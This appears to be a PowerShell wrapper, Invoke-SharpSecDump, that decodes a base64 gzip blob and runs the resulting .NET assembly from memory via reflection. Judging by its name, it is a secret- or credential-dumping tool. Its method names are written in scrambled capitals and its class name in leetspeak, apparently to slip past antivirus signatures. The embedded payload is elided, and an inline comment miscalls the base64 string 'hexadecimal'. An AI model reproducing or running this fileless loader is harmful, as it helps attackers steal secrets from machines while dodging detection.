function Invoke-SharpSecDump
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = "-help"
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIA...AAA=")) # The omitted "H4sIA...AAA=" is actually a 25309 character long hexadecimal string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [Sh4rpS3cD0mp.RegQueryValueDemo]::Main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
